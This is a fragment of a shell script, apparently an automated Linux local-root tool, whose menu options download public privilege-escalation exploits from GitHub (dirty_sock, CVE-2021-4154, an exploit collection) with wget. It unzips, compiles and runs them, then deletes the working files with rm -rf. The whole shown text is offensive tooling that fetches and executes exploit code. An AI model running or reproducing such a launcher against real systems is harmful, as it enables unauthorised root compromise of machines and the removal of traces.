...
if [ $localroot = 5 ]; then
    ...
    wget https://github.com/initstring/dirty_sock/archive/refs/heads/master.zip -O dirty_sock-master.zip && unzip dirty_sock-master.zip && cd dirty_sock-master && python3 dirty_sockv2.py
    ...
    cd .. && wget https://github.com/Markakd/CVE-2021-4154/archive/refs/heads/main.zip -O CVE-2021-4154-main.zip && unzip CVE-2021-4154-main.zip && cd CVE-2021-4154-main && gcc exp.c -o exp && gcc kctf_exp.c -o kctf
    ./exp && ./kctf
    rm -rf ./*
fi
...
# exploit folder
if [ $localroot = 6 ]; then
    wget https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits/archive/refs/heads/master.zip -O /tmp/Linux-Privilege-Escalation-Exploits-master.zip && unzip /tmp/Linux-Privilege-Escalation-Exploits-master.zip -d /tmp/ && mv /tmp/Linux-Privilege-Escalation-Exploits-master /tmp/Linux-Privilege-Escalation-Exploits
